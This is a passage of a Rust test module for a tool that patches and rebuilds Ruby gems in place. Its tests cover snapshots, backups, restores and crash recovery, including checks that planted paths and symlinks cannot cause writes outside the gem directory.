                ],
                created: vec!["ext/a/mkmf.log".to_string()],
            }
        );
        assert_eq!(stale_build(&copy, &probe, &[], &snapshot, &changes), None);
        back_up_tree_changes(&copy, &snapshot, &[], &changes).unwrap();
        let in_tree = in_tree_artifacts(&copy, &probe, &[], &changes);
        assert_eq!(in_tree, ["ext/a/liba.bundle"]);
        commit_build(&copy, &probe, &scope, &record, &aside, &in_tree).unwrap();
        remove_dir_if_exists(&snapshot.dir).unwrap();

        let marker = read_marker_sync(&copy.gem_dir).unwrap();
        assert_eq!(
            marker.lib_artifacts.keys().collect::<Vec<_>>(),
            ["ext/a/liba.bundle"]
        );
        assert!(marker_holds(&marker, &copy, &scope, &record));
        std::fs::write(copy.gem_dir.join("ext/a/liba.bundle"), b"another").unwrap();
        assert!(
            !marker_holds(&marker, &copy, &scope, &record),
            "a library that is not the built one is not attested"
        );

        // A second build over socket-patch's own: the backup keeps the
        // original of what the first replaced, and the file the first
        // added still goes with the restore.
        let aside = set_aside(&copy, &probe).unwrap();
        let snapshot = snapshot_tree(&copy, &probe.extension_dir, &record_paths()).unwrap();
        std::fs::write(copy.gem_dir.join("ext/a/liba.bundle"), b"built again").unwrap();
        std::fs::write(copy.gem_dir.join("ext/a/mkmf.log"), b"log 2").unwrap();
        std::fs::create_dir_all(&probe.extension_dir).unwrap();
        std::fs::write(probe.extension_dir.join(BUILD_COMPLETE), b"").unwrap();
        let changes = tree_changes(&copy, &snapshot);
        back_up_tree_changes(&copy, &snapshot, &[], &changes).unwrap();
        let in_tree = in_tree_artifacts(&copy, &probe, &[], &changes);
        commit_build(&copy, &probe, &scope, &record, &aside, &in_tree).unwrap();
        remove_dir_if_exists(&snapshot.dir).unwrap();

        let marker = read_marker_sync(&copy.gem_dir);
        restore_backup(&copy, marker.as_ref()).unwrap();
        assert_eq!(
            (tree_bytes(&copy.gem_dir), tree_bytes(&probe.extension_dir)),
            installed,
            "the gem is as `gem install` left it"
        );
    }

    /// A run that died after it recorded an in-place build, before it
    /// dropped the parked one and the snapshot, left a finished build. The
    /// next run keeps it with its tree: putting the old library back
    /// under the new marker would leave the gem running unpatched code.
    #[test]
    fn a_committed_in_place_build_is_not_undone_by_the_next_run() {
        let tmp = tempfile::tempdir().unwrap();
        let (copy, probe) = in_tree_gem(tmp.path());
        let (scope, record) = in_tree_scope();
        let parked = parked_build_path(&probe.extension_dir);

        assert!(back_up_original(&copy, &probe, &[]).unwrap());
        let aside = set_aside(&copy, &probe).unwrap();
        let snapshot = snapshot_tree(&copy, &probe.extension_dir, &record_paths()).unwrap();
        build_in_tree(&copy, &probe);
        let changes = tree_changes(&copy, &snapshot);
        back_up_tree_changes(&copy, &snapshot, &[], &changes).unwrap();
        let in_tree = in_tree_artifacts(&copy, &probe, &[], &changes);
        commit_build(&copy, &probe, &scope, &record, &aside, &in_tree).unwrap();
        drop(aside);
        // As the run that died left it: the parked build still there.
        std::fs::create_dir_all(&parked).unwrap();
        let built = tree_bytes(&copy.gem_dir);

        assert!(recover_interrupted_rebuild_sync(&copy, Some("lib")).unwrap());
        assert_eq!(tree_bytes(&copy.gem_dir), built);
        assert!(!parked.exists());
        assert!(!snapshot.dir.exists());
        let marker = read_marker_sync(&copy.gem_dir).unwrap();
        assert!(marker_holds(&marker, &copy, &scope, &record));
    }

    /// A product taken out of the build's way and made again with the
    /// bytes it had is attested like one that changed, so the backup holds
    /// it too: the restore removes what a marker lists and the backup
    /// does not, and this file is the gem's own.
    #[test]
    fn a_product_rebuilt_with_the_same_bytes_survives_the_restore() {
        let tmp = tempfile::tempdir().unwrap();
        let (copy, probe) = in_tree_gem(tmp.path());
        let (scope, record) = in_tree_scope();
        let installed = (tree_bytes(&copy.gem_dir), tree_bytes(&probe.extension_dir));
        let removed = ["ext/a/liba.bundle".to_string()];

        assert!(back_up_original(&copy, &probe, &[]).unwrap());
        let aside = set_aside(&copy, &probe).unwrap();
        let snapshot = snapshot_tree(&copy, &probe.extension_dir, &record_paths()).unwrap();
        std::fs::remove_file(copy.gem_dir.join(&removed[0])).unwrap();
        std::fs::write(copy.gem_dir.join(&removed[0]), b"original library").unwrap();
        std::fs::create_dir_all(&probe.extension_dir).unwrap();
        std::fs::write(probe.extension_dir.join(BUILD_COMPLETE), b"").unwrap();
        let changes = tree_changes(&copy, &snapshot);
        assert_eq!(changes, TreeChanges::default());
        back_up_tree_changes(&copy, &snapshot, &removed, &changes).unwrap();
        let in_tree = in_tree_artifacts(&copy, &probe, &removed, &changes);
        assert_eq!(in_tree, removed);
        commit_build(&copy, &probe, &scope, &record, &aside, &in_tree).unwrap();
        remove_dir_if_exists(&snapshot.dir).unwrap();

        let marker = read_marker_sync(&copy.gem_dir);
        restore_backup(&copy, marker.as_ref()).unwrap();
        assert_eq!(
            (tree_bytes(&copy.gem_dir), tree_bytes(&probe.extension_dir)),
            installed
        );
    }

    /// The source gem of [`in_tree_gem`], unpacked: what the installed
    /// copy holds of it, a Makefile its build script renames and a dir of
    /// sources its build deletes.
    fn source_gem_of(copy: &GemCopy, at: &Path) -> PathBuf {
        let staged = at.join("staged");
        for (rel, bytes) in [
            ("ext/a/a.c", "patched source"),
            ("ext/a/Makefile.real", "the makefile"),
            ("ext/a/vendor/src/b.c", "packed source"),
            ("lib/a.rb", "ruby"),
            (MARKER_FILE, "not the gem's"),
        ] {
            let path = staged.join(rel);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, bytes).unwrap();
        }
        assert!(!copy.gem_dir.join("ext/a/Makefile.real").exists());
        staged
    }

    fn rels(files: &[ShippedFile]) -> Vec<&str> {
        files.iter().map(|file| file.rel.as_str()).collect()
    }

    /// The files a fresh install would hold and the copy does not are the
    /// ones its build used up: they are read from the pristine source gem,
    /// with nothing of this module's among them (#2106).
    #[test]
    fn the_files_a_build_used_up_are_read_from_the_source_gem() {
        let tmp = tempfile::tempdir().unwrap();
        let (copy, _probe) = in_tree_gem(tmp.path());
        let staged = source_gem_of(&copy, tmp.path());
        let used_up = used_up_files(&copy.gem_dir, &staged);
        assert_eq!(
            rels(&used_up),
            ["ext/a/Makefile.real", "ext/a/vendor/src/b.c"]
        );
        assert_eq!(used_up[0].bytes, b"the makefile");
        assert_eq!(
            used_up[0].modified,
            std::fs::metadata(staged.join("ext/a/Makefile.real"))
                .unwrap()
                .modified()
                .ok()
        );
    }

    /// The used-up files are put back for the in-place build, after the
    /// snapshot: a failed build's undo removes them, and after a finished
    /// one those the build left alone go again, with the dirs made for
    /// them. One the build wrote to is the build's (#2106).
    #[test]
    fn used_up_files_are_given_back_for_the_build_and_taken_away_after() {
        let tmp = tempfile::tempdir().unwrap();
        let (copy, probe) = in_tree_gem(tmp.path());
        let staged = source_gem_of(&copy, tmp.path());
        // The stage was unpacked before the patched sources were written.
        let unpacked = std::time::SystemTime::now() - Duration::from_secs(3600);
        std::fs::File::options()
            .write(true)
            .open(staged.join("ext/a/Makefile.real"))
            .unwrap()
            .set_modified(unpacked)
            .unwrap();
        let used_up = used_up_files(&copy.gem_dir, &staged);
        let installed = tree_bytes(&copy.gem_dir);
        let dirs = |copy: &GemCopy| copy.gem_dir.join("ext/a/vendor").exists();

        // A build that fails: the snapshot's undo, then the dirs.
        let snapshot = snapshot_tree(&copy, &probe.extension_dir, &record_paths()).unwrap();
        let given = give_back(&copy, &snapshot, &used_up, &record_paths()).unwrap();
        assert_eq!(
            std::fs::read(copy.gem_dir.join("ext/a/Makefile.real")).unwrap(),
            b"the makefile"
        );
        assert!(copy.gem_dir.join("ext/a/vendor/src/b.c").is_file());
        // Not newer than the patched source: a build that makes one from
        // the other would take the file given back for current.
        let written = |rel: &str| {
            std::fs::metadata(copy.gem_dir.join(rel))
                .unwrap()
                .modified()
                .unwrap()
        };
        assert_eq!(Some(written("ext/a/Makefile.real")), used_up[0].modified);
        assert!(written("ext/a/Makefile.real") < written("ext/a/a.c"));
        build_in_tree(&copy, &probe);
        restore_tree(&copy, &snapshot.dir).unwrap();
        take_away(&copy, &given);
        assert_eq!(tree_bytes(&copy.gem_dir), installed);
        assert!(!dirs(&copy), "the dirs made for the files go with them");

        // A build that finishes, having renamed one file as argon2's
        // script does and left the other: neither is a change it made.
        let snapshot = snapshot_tree(&copy, &probe.extension_dir, &record_paths()).unwrap();
        let given = give_back(&copy, &snapshot, &used_up, &record_paths()).unwrap();
        std::fs::rename(
            copy.gem_dir.join("ext/a/Makefile.real"),
            copy.gem_dir.join("ext/a/Makefile"),
        )
        .unwrap();
        take_away(&copy, &given);
        assert!(!dirs(&copy));
        assert_eq!(
            tree_changes(&copy, &snapshot),
            TreeChanges {
                replaced: vec!["ext/a/Makefile".to_string()],
                created: vec![],
            }
        );
        restore_tree(&copy, &snapshot.dir).unwrap();

        // A file the build wrote to stays, and is one it created.
        let snapshot = snapshot_tree(&copy, &probe.extension_dir, &record_paths()).unwrap();
        let given = give_back(&copy, &snapshot, &used_up, &record_paths()).unwrap();
        std::fs::write(copy.gem_dir.join("ext/a/vendor/src/b.c"), b"generated").unwrap();
        take_away(&copy, &given);
        assert_eq!(
            tree_changes(&copy, &snapshot).created,
            ["ext/a/vendor/src/b.c"]
        );
        restore_tree(&copy, &snapshot.dir).unwrap();
        take_away(&copy, &given);
        assert_eq!(tree_bytes(&copy.gem_dir), installed);
    }

    /// Nothing is written over a file the tree holds, in place of a file
    /// of the record, or through a link in the gem dir (#2106).
    #[test]
    fn a_used_up_file_is_only_written_where_the_tree_has_none() {
        let tmp = tempfile::tempdir().unwrap();
        let (copy, probe) = in_tree_gem(tmp.path());
        let shipped = |rel: &str| ShippedFile {
            rel: rel.to_string(),
            bytes: b"shipped".to_vec(),
            permissions: std::fs::metadata(copy.gem_dir.join("lib/a.rb"))
                .unwrap()
                .permissions(),
            modified: None,
        };
        #[cfg_attr(not(unix), allow(unused_mut))]
        let mut used_up = vec![
            shipped("ext/a/Makefile"),
            shipped("ext/a/a.c"),
            shipped("../outside"),
            shipped(MARKER_FILE),
        ];
        let outside = tmp.path().join("elsewhere");
        #[cfg(unix)]
        {
            std::fs::create_dir(&outside).unwrap();
            std::os::unix::fs::symlink(&outside, copy.gem_dir.join("linked")).unwrap();
            used_up.push(shipped("linked/planted"));
        }
        // The record's file is gone from the tree (a patch may delete one).
        std::fs::remove_file(copy.gem_dir.join("ext/a/a.c")).unwrap();
        let installed = tree_bytes(&copy.gem_dir);
        let snapshot = snapshot_tree(&copy, &probe.extension_dir, &record_paths()).unwrap();
        let given = give_back(&copy, &snapshot, &used_up, &record_paths()).unwrap();
        assert!(given.files.is_empty(), "{given:?}");
        assert_eq!(tree_bytes(&copy.gem_dir), installed);
        assert!(!outside.join("planted").exists());
        assert!(!tmp.path().join("gems/outside").exists());
    }

    /// A build that fails part-way has already written into the gem's own
    /// tree. The snapshot puts every file back, and goes.
    #[test]
    fn a_failed_in_place_build_leaves_the_gems_own_tree_as_it_was() {
        let tmp = tempfile::tempdir().unwrap();
        let (copy, probe) = in_tree_gem(tmp.path());
        let installed = tree_bytes(&copy.gem_dir);
        let snapshot = snapshot_tree(&copy, &probe.extension_dir, &record_paths()).unwrap();
        build_in_tree(&copy, &probe);
        restore_tree(&copy, &snapshot.dir).unwrap();
        assert_eq!(tree_bytes(&copy.gem_dir), installed);

        // A snapshot that does not say which files it left out is not
        // used: it would take the record's files for the build's.
        let snapshot = snapshot_tree(&copy, &probe.extension_dir, &record_paths()).unwrap();
        std::fs::remove_file(snapshot.dir.join(SNAPSHOT_LEFT)).unwrap();
        build_in_tree(&copy, &probe);
        assert!(restore_tree(&copy, &snapshot.dir).is_err());
        assert!(copy.gem_dir.join("ext/a/a.c").is_file());
        assert!(copy.gem_dir.join("ext/a/mkmf.log").is_file());
    }

    /// A build that exits cleanly and compiles nothing, over a tree that
    /// keeps a library, has left Ruby the library that was there. So has
    /// one that leaves a product it was made to build again unbuilt
    /// (#2105). A gem with no library anywhere compiles nothing here, and
    /// that is not stale.
    #[test]
    fn a_build_that_leaves_no_compiled_code_is_stale() {
        let tmp = tempfile::tempdir().unwrap();
        let (copy, probe) = in_tree_gem(tmp.path());
        let snapshot = snapshot_tree(&copy, &probe.extension_dir, &record_paths()).unwrap();

        // Nothing changed, or only what Ruby does not load.
        let nothing = tree_changes(&copy, &snapshot);
        assert_eq!(nothing, TreeChanges::default());
        let why = stale_build(&copy, &probe, &[], &snapshot, &nothing).unwrap();
        assert!(why.contains("compiled nothing"), "{why}");
        std::fs::write(copy.gem_dir.join("ext/a/mkmf.log"), b"log").unwrap();
        let log_only = tree_changes(&copy, &snapshot);
        assert!(stale_build(&copy, &probe, &[], &snapshot, &log_only).is_some());
        // An artifact in the extension dir is compiled code.
        std::fs::create_dir_all(probe.extension_dir.join("a")).unwrap();
        std::fs::write(probe.extension_dir.join("a/a.bundle"), b"built").unwrap();
        assert_eq!(stale_build(&copy, &probe, &[], &snapshot, &nothing), None);
        std::fs::remove_dir_all(probe.extension_dir.join("a")).unwrap();

        // A product taken out of the build's way must be there again, and
        // is attested though its bytes are the ones it had.
        let removed = ["ext/a/liba.bundle".to_string()];
        assert_eq!(
            stale_build(&copy, &probe, &removed, &snapshot, &nothing),
            None
        );
        assert_eq!(
            in_tree_artifacts(&copy, &probe, &removed, &nothing),
            removed
        );
        std::fs::remove_file(copy.gem_dir.join("ext/a/liba.bundle")).unwrap();
        let gone = tree_changes(&copy, &snapshot);
        let why = stale_build(&copy, &probe, &removed, &snapshot, &gone).unwrap();
        assert!(why.contains("ext/a/liba.bundle"), "{why}");

        // No library in the tree and none built: nothing for Ruby to load.
        let plain = snapshot_tree(&copy, &probe.extension_dir, &record_paths()).unwrap();
        let nothing = tree_changes(&copy, &plain);
        assert_eq!(stale_build(&copy, &probe, &[], &plain, &nothing), None);
    }

    /// A run that died during an in-place build left the gem's own tree
    /// half-built beside its snapshot. The next run puts the tree back
    /// with the parked build, and leaves the record's files as it finds
    /// them: a `rollback` has put the original source back by then. A
    /// snapshot with no parked build is nobody's: it goes, and the tree
    /// stays.
    #[test]
    fn an_interrupted_in_place_build_gets_its_tree_back() {
        let tmp = tempfile::tempdir().unwrap();
        let (copy, probe) = in_tree_gem(tmp.path());
        let mut installed = (tree_bytes(&copy.gem_dir), tree_bytes(&probe.extension_dir));
        let aside = set_aside(&copy, &probe).unwrap();
        let snapshot = snapshot_tree(&copy, &probe.extension_dir, &record_paths()).unwrap();
        std::fs::write(copy.gem_dir.join("ext/a/liba.bundle"), b"half").unwrap();
        std::fs::remove_file(copy.gem_dir.join("ext/a/a.o")).unwrap();
        std::fs::write(copy.gem_dir.join("ext/a/mkmf.log"), b"log").unwrap();
        drop(aside);
        std::fs::write(copy.gem_dir.join("ext/a/a.c"), b"original source").unwrap();
        installed
            .0
            .insert("ext/a/a.c".to_string(), b"original source".to_vec());

        assert!(recover_interrupted_rebuild_sync(&copy, Some("lib")).unwrap());
        assert_eq!(
            (tree_bytes(&copy.gem_dir), tree_bytes(&probe.extension_dir)),
            installed
        );
        assert!(!snapshot.dir.exists());

        let stale = snapshot_tree(&copy, &probe.extension_dir, &record_paths()).unwrap();
        std::fs::write(copy.gem_dir.join("ext/a/liba.bundle"), b"committed").unwrap();
        assert!(!recover_interrupted_rebuild_sync(&copy, Some("lib")).unwrap());
        assert!(!stale.dir.exists());
        assert_eq!(
            std::fs::read(copy.gem_dir.join("ext/a/liba.bundle")).unwrap(),
            b"committed"
        );
    }

    /// The snapshot and the backup of an in-place build are acted on by
    /// what they lack: a file the snapshot does not list is removed, and a
    /// build the backup does not record loses its files to a rollback. So
    /// neither is used when it cannot be read whole. A gem tree that
    /// cannot be listed gets no snapshot; a snapshot whose copies cannot be
    /// listed restores nothing and removes nothing; a backup whose
    /// description is there and cannot be read is not taken for no backup.
    #[cfg(unix)]
    #[test]
    fn a_snapshot_or_backup_that_cannot_be_read_is_never_taken_for_none() {
        use std::os::unix::fs::PermissionsExt;
        let tmp = tempfile::tempdir().unwrap();
        let (copy, probe) = in_tree_gem(tmp.path());
        let installed = tree_bytes(&copy.gem_dir);
        let absent = ["patches/a.patch".to_string()];

        // A backup whose description is there and is not one.
        let backup = copy.gem_dir.join(BACKUP_DIR);
        std::fs::create_dir_all(&backup).unwrap();
        std::fs::write(backup.join(BACKUP_INFO), b"not json").unwrap();
        let snapshot = snapshot_tree(&copy, &probe.extension_dir, &record_paths()).unwrap();
        build_in_tree(&copy, &probe);
        let changes = tree_changes(&copy, &snapshot);
        assert!(read_backup_info(&backup).is_none());
        for why in [
            back_up_tree_changes(&copy, &snapshot, &[], &changes).unwrap_err(),
            note_absent_files(&backup, &absent).unwrap_err(),
        ] {
            let why = why.to_string();
            assert!(
                why.contains(BACKUP_INFO)
                    && why.contains("could not be read as a backup's description"),
                "{why}"
            );
        }
        assert!(!backup.join("lib").exists(), "nothing was added to it");
        // With no description at all there is no backup to add to.
        std::fs::remove_file(backup.join(BACKUP_INFO)).unwrap();
        back_up_tree_changes(&copy, &snapshot, &[], &changes).unwrap();
        note_absent_files(&backup, &absent).unwrap();
        std::fs::remove_dir_all(&backup).unwrap();
        restore_tree(&copy, &snapshot.dir).unwrap();
        assert_eq!(tree_bytes(&copy.gem_dir), installed);

        // Root reads any directory: the rest needs a user.
        if unsafe { libc::geteuid() } == 0 {
            eprintln!("skipping the unreadable-directory cases: running as root");
            return;
        }
        let mode = |path: &Path, mode: u32| {
            std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode)).unwrap()
        };

        // A dir of the gem's tree that cannot be listed: no snapshot is
        // taken of the rest, since undoing a build from it would remove
        // nothing it does not show, and put back nothing it does not hold.
        let hidden = copy.gem_dir.join("ext/a");
        mode(&hidden, 0o000);
        let taken = snapshot_tree(&copy, &probe.extension_dir, &record_paths());
        mode(&hidden, 0o755);
        let why = taken
            .err()
            .expect("a partial snapshot was taken")
            .to_string();
        assert!(why.contains("could not be listed"), "{why}");
        let dir = tree_snapshot_path(&probe.extension_dir);
        assert!(!dir.exists() && !tree_snapshot_stage(&dir).exists());

        // A snapshot whose copies cannot be listed: read as holding none,
        // it would have every file of the gem removed.
        let snapshot = snapshot_tree(&copy, &probe.extension_dir, &record_paths()).unwrap();
        build_in_tree(&copy, &probe);
        let built = tree_bytes(&copy.gem_dir);
        let copies = snapshot.dir.join(SNAPSHOT_TREE);
        mode(&copies, 0o000);
        let restored = restore_tree(&copy, &snapshot.dir);
        mode(&copies, 0o755);
        let why = restored.unwrap_err().to_string();
        assert!(why.contains("could not be listed"), "{why}");
        assert_eq!(
            tree_bytes(&copy.gem_dir),
            built,
            "the gem's files were removed"
        );
        assert!(
            snapshot.dir.is_dir(),
            "the snapshot is kept for the next run"
        );
        restore_tree(&copy, &snapshot.dir).unwrap();
        assert_eq!(tree_bytes(&copy.gem_dir), installed);
    }

    /// A gem home can come from the repository being scanned, and recovery
    /// runs before anything else is looked at. A snapshot planted beside a
    /// parked build, naming a file under a link in the gem dir, writes
    /// nothing through that link: no file is created or replaced outside
    /// the gem dir, and none of the gem's own is removed.
    #[cfg(unix)]
    #[test]
    fn a_planted_tree_snapshot_writes_nothing_through_a_link() {
        let tmp = tempfile::tempdir().unwrap();
        let (copy, probe) = in_tree_gem(tmp.path());
        let installed = tree_bytes(&copy.gem_dir);
        let outside = tmp.path().join("outside");
        std::fs::create_dir_all(&outside).unwrap();
        std::fs::write(outside.join("existing"), b"mine").unwrap();
        std::fs::create_dir_all(parked_build_path(&probe.extension_dir)).unwrap();
        let planted = tree_snapshot_path(&probe.extension_dir);
        std::fs::create_dir_all(planted.join(SNAPSHOT_TREE).join("out")).unwrap();
        for name in ["created", "existing"] {
            let file = planted.join(SNAPSHOT_TREE).join("out").join(name);
            std::fs::write(file, b"planted").unwrap();
        }
        std::fs::write(planted.join(SNAPSHOT_LEFT), b"[]").unwrap();
        std::os::unix::fs::symlink(&outside, copy.gem_dir.join("out")).unwrap();

        let why = recover_interrupted_rebuild_sync(&copy, Some("lib"))
            .unwrap_err()
            .to_string();
        assert!(
            why.contains("is a symlink") && why.contains("out/created"),
            "{why}"
        );
        assert!(
            !outside.join("created").exists(),
            "written through the link"
        );
        assert_eq!(std::fs::read(outside.join("existing")).unwrap(), b"mine");
        assert_eq!(
            tree_bytes(&copy.gem_dir),
            installed,
            "the gem's own files were removed"
        );
    }
}
